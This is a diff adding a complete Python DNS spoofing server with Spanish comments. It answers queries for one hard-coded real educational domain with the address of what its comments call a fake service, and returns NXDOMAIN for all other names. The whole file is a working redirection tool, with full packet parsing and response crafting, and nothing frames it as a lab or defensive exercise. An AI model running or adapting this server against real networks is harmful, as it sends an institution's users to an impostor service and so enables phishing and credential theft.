@@ -1,0 +1,115 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import socket
+import threading
+
+DOMAIN = "itla.edu.do"          # Dominio a spoofear (sin punto final)
+REDIRECT_IP = "20.24.11.10"     # IP del servicio falso
+LISTEN_IP = "0.0.0.0"
+LISTEN_PORT = 53
+
+def decode_dns_name(data, offset):
+    """Decodifica un nombre DNS desde 'data' en la posición 'offset'.
+       Retorna (nombre, nueva_posición)"""
+    labels = []
+    pos = offset
+    jumped = False
+    jumps = 0
+    while True:
+        length = data[pos]
+        if length == 0:
+            pos += 1
+            break
+        # Verificar si es un puntero (bits 11xxxxxx)
+        if length & 0xC0 == 0xC0:
+            if not jumped:
+                # Es un puntero: calcular la dirección apuntada
+                pointer = ((length & 0x3F) << 8) | data[pos + 1]
+                # Guardar la posición después del puntero para usarla como final
+                pos_after_pointer = pos + 2
+                pos = pointer
+                jumped = True
+                continue
+            else:
+                # Ya saltamos, solo avanzamos 2 bytes
+                pos += 2
+                break
+        else:
+            # Etiqueta normal: longitud + bytes
+            label = data[pos + 1:pos + 1 + length].decode('utf-8', errors='ignore')
+            labels.append(label)
+            pos += length + 1
+
+    if jumped:
+        final_pos = pos_after_pointer
+    else:
+        final_pos = pos
+    return '.'.join(labels), final_pos
+
+def build_response(data, ip, nxdomain=False):
+    """Construye una respuesta DNS.
+       Si nxdomain=True, respuesta con código NXDOMAIN.
+       Si nxdomain=False, respuesta con registro A apuntando a 'ip'."""
+    req_id = data[:2]
+    if nxdomain:
+        flags = b"\x81\x83"  # respuesta, NXDOMAIN
+    else:
+        flags = b"\x81\x80"  # respuesta, éxito
+    header = req_id + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00"
+    # La pregunta original empieza en el byte 12 (después del header)
+    question = data[12:]
+    if nxdomain:
+        return header + question
+    else:
+        # Respuesta con un registro A
+        answer = (b"\xc0\x0c"              # puntero al nombre (offset 12)
+                  b"\x00\x01"              # tipo A
+                  b"\x00\x01"              # clase IN
+                  b"\x00\x00\x00\x78"      # TTL 120
+                  b"\x00\x04" +            # longitud datos
+                  socket.inet_aton(ip))
+        return header + question + answer
+
+def handle_query(data, addr, sock):
+    try:
+        if len(data) < 12:
+            return
+        # Decodificar el nombre consultado
+        qname, _ = decode_dns_name(data, 12)
+        print(f"[*] Consulta para '{qname}' desde {addr[0]}")
+        if qname == DOMAIN:
+            print(f"[+] Coincide! Respondiendo {REDIRECT_IP}")
+            response = build_response(data, REDIRECT_IP, nxdomain=False)
+        else:
+            response = build_response(data, "", nxdomain=True)
+        sock.sendto(response, addr)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        sock.bind((LISTEN_IP, LISTEN_PORT))
+    except PermissionError:
+        print("[!] Necesitas ejecutar con sudo (puerto 53 privilegiado).")
+        return
+    except OSError as e:
+        print(f"[!] Error al bind: {e}. ¿Otro servicio usando el puerto 53?")
+        return
+
+    print(f"[*] Servidor DNS escuchando en {LISTEN_IP}:{LISTEN_PORT}")
+    print(f"[*] Respondiendo {DOMAIN} -> {REDIRECT_IP}")
+    print("[*] Otros dominios → NXDOMAIN")
+    print("[*] Esperando consultas... (Ctrl+C para salir)")
+
+    try:
+        while True:
+            data, addr = sock.recvfrom(1024)
+            threading.Thread(target=handle_query, args=(data, addr, sock), daemon=True).start()
+    except KeyboardInterrupt:
+        print("\n[!] Servidor detenido.")
+
+if __name__ == "__main__":
+    main()
